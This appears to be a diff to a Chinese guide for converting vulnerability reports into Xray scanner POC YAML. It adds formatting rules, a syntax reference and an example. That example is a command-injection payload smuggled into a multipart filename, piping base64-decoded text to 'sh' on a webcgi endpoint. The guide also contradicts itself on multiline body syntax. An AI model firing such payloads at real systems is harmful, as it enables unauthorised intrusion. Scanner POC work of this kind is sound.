@@ -88,19 +88,124 @@ Body   → 从空行后提取（如有）
 根据漏洞类型从 `references/poc_template.md` 选择对应模板，填充提取的信息。
 
 **生成规则：**
-- 必须使用 `randomInt()` 生成随机验证值，禁止固定字符串
-- 文件读取类必须同时包含 Linux + Windows 两条规则
+- **Body 格式必须使用单行字符串**，不能使用多行 `|` 语法
+- 换行使用 `\r\n`（HTTP 标准），不是 `\n`
+- Body 中的引号必须转义为 `\"`
+- Headers 的值必须用引号包裹（如 `"multipart/form-data; boundary=xxx"`）
+- 每个规则的 expression 必须在 request 同级，不能嵌套
+- 最终 expression 必须是单行，不能使用 `|` 多行语法
+- 状态码匹配必须精确（如 502 就写 502，不要写 200）
 - 所有 YAML 字段对齐使用空格（2空格缩进）
 
-### 4. 用户确认（检查点）
+**正确示例：**
+```yaml
+rules:
+  r0:
+    request:
+      cache: true
+      method: POST
+      path: /api/upload
+      headers:
+        Content-Type: "multipart/form-data; boundary=----Boundary"
+      body: "------Boundary\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\ntest\r\n------Boundary--"
+    expression: response.status == 502
+  r1:
+    request:
+      cache: true
+      method: GET
+      path: /test.txt
+    expression: response.status == 200 && response.body_string.contains("uid=")
+expression: r0() && r1()
+```
 
-生成 POC 后，**在写入文件前暂停**，展示：
+**错误示例（不要这样写）：**
+```yaml
+# ❌ 错误：body 使用多行语法
+body: |
+  ------Boundary
+  Content-Disposition: form-data
+  
+# ❌ 错误：expression 嵌套在 request 内
+request:
+  method: GET
+  expression: response.status == 200
+
+# ❌ 错误：最终 expression 使用多行
+expression: |
+  r0() && r1()
+
+# ❌ 错误：Headers 值没有引号
+Content-Type: multipart/form-data
+```
+
+### 4. 关键信息确认（必须询问）
+
+在生成 POC 前，**必须向用户确认以下关键信息**：
+
+**对于命令执行类漏洞：**
+1. **第一个请求（r0）的预期状态码是什么？**
+   - 示例：「执行命令后返回 200 还是 502？还是其他状态码？」
+   - 如果不确定，询问：「你手动测试时，发送 payload 后服务器返回什么状态码？」
+
+2. **生成的文件路径和访问路径是否一致？**
+   - 示例：「命令写入 `/ysdisk/www/webfile/poc.txt`，访问路径是 `/poc.txt` 对吗？」
+   - 如果路径不同，询问：「Web 根目录是什么？访问路径应该是什么？」
+
+3. **是否需要随机文件名？**
+   - 示例：「使用固定文件名 `poc.txt` 还是随机文件名避免冲突？」
+
+4. **验证内容的特征是什么？**
+   - 示例：「文件内容包含 `uid=` 就能确认漏洞吗？还是需要其他特征？」
+   - 如果用户提供了实际输出（如 `uid=0(ls@yf) gid=0(root)`），使用更精确的匹配
+
+**对于文件读取类漏洞：**
+1. **是否需要同时支持 Linux 和 Windows？**
+2. **文件内容的特征字符串是什么？**
+
+**对于 SQL 注入类漏洞：**
+1. **是报错型、时间盲注还是布尔盲注？**
+2. **基准请求（r0）的延迟是多少？**（时间盲注必须）
+
+### 5. YAML 语法校验
+
+生成 POC 后，**必须先进行 YAML 语法校验**：
+
+```python
+import yaml
+import sys
+
+try:
+    with open('poc.yaml', 'r', encoding='utf-8') as f:
+        yaml.safe_load(f)
+    print("✓ YAML 语法正确")
+    sys.exit(0)
+except yaml.YAMLError as e:
+    print(f"✗ YAML 语法错误: {e}")
+    sys.exit(1)
+```
+
+**校验步骤：**
+1. 使用 Python 的 `yaml.safe_load()` 解析生成的 YAML
+2. 如果解析成功，显示 "✓ YAML 语法正确"
+3. 如果解析失败，显示具体错误信息并修复
+
+**常见 YAML 语法错误：**
+- 缩进不一致（必须使用 2 空格）
+- 引号未闭合
+- 特殊字符未转义
+- 冒号后缺少空格
+- 多行字符串格式错误
+
+### 6. 用户确认（检查点）
+
+YAML 校验通过后，**在写入文件前暂停**，展示：
 
 ```
 生成的 POC 预览：
 ---
 name: xxx
 path: D:\Tools\xray\pocs/xxx.yaml
+YAML 语法: ✓ 正确
 ---
 
 请确认：
@@ -182,56 +287,164 @@ detail:
     - https://example.com
 ```
 
-### 示例 2：漏洞描述转 POC
+### 示例 2：命令执行漏洞（文件写入验证）
 
 **输入：**
-```
-某系统存在命令执行漏洞，在 /api/exec 接口，POST 请求，
-参数为 cmd，执行命令后返回结果在响应体中。
+```http
+POST /cgi/webcgi?syscore=checklogin HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCheck
+
+------WebKitFormBoundaryCheck
+Content-Disposition: form-data; name="file"; filename="1/;echo aWQgPiAveXNkaXNrL3d3dy93ZWJmaWxlL3BvYy50eHQ= | base64 -d | sh &#"
+Content-Type: text/plain
+
+1111
+------WebKitFormBoundaryCheck--
 ```
 
 **输出：**
 ```yaml
-name: poc-yaml-example-system-rce
+name: poc-yaml-webcgi-rce-file-write
 transport: http
-set:
-  s1: randomInt(100000, 200000)
-  s2: randomInt(10000, 20000)
 rules:
   r0:
     request:
       cache: true
       method: POST
-      path: /api/exec
+      path: /cgi/webcgi?syscore=checklogin
       headers:
-        Content-Type: application/x-www-form-urlencoded
-      body: |
-        cmd=expr%20{{s1}}%20-%20{{s2}}
-    expression: |
-      response.status == 200 && response.body_string.contains(string(s1 - s2))
-expression: |
-  r0()
+        Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryCheck"
+      body: "------WebKitFormBoundaryCheck\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1/;echo aWQgPiAveXNkaXNrL3d3dy93ZWJmaWxlL3BvYy50eHQ= | base64 -d | sh &#\"\r\nContent-Type: text/plain\r\n\r\n1111\r\n------WebKitFormBoundaryCheck--"
+    expression: response.status == 502
+  r1:
+    request:
+      cache: true
+      method: GET
+      path: /poc.txt
+    expression: response.status == 200 && response.body_string.contains("uid=") && response.body_string.contains("gid=")
+expression: r0() && r1()
 detail:
   author: xray-poc-converter
-  links: []
+  links:
+    - https://example.com
 ```
 
-## 支持的表达式函数
+## Xray POC 完整语法规范
 
-### 字符串操作
-- `contains(str)` - 包含字符串
-- `matches(regex)` - 正则匹配
-- `substr(str, start, length)` - 截取字符串
+### 1. 顶层字段
 
-### 随机/数学
-- `randomInt(min, max)` - 随机整数
-- `md5(str)` - MD5 哈希
+| 字段 | 类型 | 必填 | 说明 |
+|------|------|------|------|
+| `name` | string | 是 | POC 名称，格式：`poc-yaml-漏洞名称` |
+| `transport` | string | 是 | 传输协议：`http` 或 `tcp` |
+| `manual` | bool | 否 | 是否手动触发，默认 `false` |
+| `set` | map | 否 | 变量定义（支持随机函数） |
+| `rules` | map | 是 | 规则定义（r0, r1, r2...） |
+| `expression` | string | 是 | 最终匹配表达式 |
+| `detail` | map | 否 | 元数据（author, links, description） |
 
-### 响应对象
-- `response.status` - HTTP 状态码
-- `response.body_string` - 响应体字符串
-- `response.body` - 响应体字节
-- `response.latency` - 响应延迟
+### 2. Request 字段
+
+| 字段 | 类型 | 说明 |
+|------|------|------|
+| `cache` | bool | 是否缓存请求（默认 true） |
+| `method` | string | HTTP 方法（GET/POST/PUT/DELETE/PATCH） |
+| `path` | string | 请求路径（支持 `{{变量}}` 插值） |
+| `headers` | map | 请求头（键值对） |
+| `body` | string | 请求体（支持多行 `|` 语法） |
+| `follow_redirects` | bool | 是否跟随重定向（默认 false） |
+
+### 3. 表达式函数
+
+#### 字符串函数
+| 函数 | 说明 | 示例 |
+|------|------|------|
+| `contains(str)` | 字符串包含 | `response.body_string.contains("admin")` |
+| `matches(regex)` | 正则匹配（字符串） | `"root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)` |
+| `bmatches(bytes)` | 正则匹配（字节） | `"\\x89PNG".bmatches(response.body)` |
+| `bcontains(bytes)` | 字节包含 | `response.body.bcontains(b"test")` |
+| `bstartsWith(bytes)` | 字节开头匹配 | `response.body.bstartsWith(bytes("HTTP"))` |
+| `substr(str, start, length)` | 字符串截取 | `substr(md5(string(s1)), 2, 28)` |
+
+#### 编码/转换函数
+| 函数 | 说明 | 示例 |
+|------|------|------|
+| `string(val)` | 转字符串 | `string(s1 - s2)` |
+| `bytes(str)` | 转字节 | `bytes(string(s1))` |
+| `base64(str)` | Base64 编码 | `base64(rand)` |
+| `base64Decode(str)` | Base64 解码 | `base64Decode("dGVzdA==")` |
+| `upper(str)` | 转大写 | `upper(rand)` |
+| `lower(str)` | 转小写 | `lower(rand)` |
+| `md5(str)` | MD5 哈希 | `md5(string(s1))` |
+
+#### 随机函数
+| 函数 | 说明 | 示例 |
+|------|------|------|
+| `randomInt(min, max)` | 随机整数 | `randomInt(100000, 200000)` |
+| `randomLowercase(length)` | 随机小写字母 | `randomLowercase(8)` |
+
+#### 响应对象属性
+| 属性 | 说明 | 示例 |
+|------|------|------|
+| `response.status` | HTTP 状态码 | `response.status == 200` |
+| `response.body` | 响应体（字节） | `response.body.bcontains(b"test")` |
+| `response.body_string` | 响应体（字符串） | `response.body_string.contains("admin")` |
+| `response.headers` | 响应头 | `response.headers["Content-Type"].contains("json")` |
+| `response.latency` | 响应延迟（毫秒） | `response.latency - r0latency >= 5000` |
+| `response.raw` | 原始响应 | `response.raw.bcontains(b"HTTP/1.1")` |
+
+#### 规则引用
+| 语法 | 说明 | 示例 |
+|------|------|------|
+| `r0()` | 调用规则 r0 | `r0() && r1()` |
+| `r0latency` | 获取 r0 的延迟 | `response.latency - r0latency >= 5000` |
+
+#### 逻辑运算符
+| 运算符 | 说明 |
+|--------|------|
+| `&&` | 逻辑与 |
+| `||` | 逻辑或 |
+| `==` | 等于 |
+| `!=` | 不等于 |
+| `>`, `<`, `>=`, `<=` | 比较运算符 |
+| `!` | 逻辑非 |
+
+### 4. 变量插值
+
+在 `path`、`headers`、`body` 中使用 `{{变量名}}` 引用 `set` 中定义的变量：
+
+```yaml
+set:
+  s1: randomInt(100000, 200000)
+  rand: randomLowercase(8)
+rules:
+  r0:
+    request:
+      path: /api?id={{s1}}
+      body: |
+        username={{rand}}
+```
+
+### 5. 多行字符串
+
+使用 `|` 保留换行，使用 `>` 折叠换行：
+
+```yaml
+body: |
+  ------WebKitFormBoundary
+  Content-Disposition: form-data; name="file"
+  
+  test
+  ------WebKitFormBoundary--
+```
+
+### 6. 规则执行顺序
+
+- 规则按 `r0`, `r1`, `r2`... 顺序定义
+- `expression` 中通过 `r0()`, `r1()` 调用规则
+- 规则只有在 `expression` 中被调用时才执行
+- 支持短路求值：`r0() && r1()` 中 r0 失败则不执行 r1
 
 ### 示例 3：Nuclei YAML 转 Xray
 
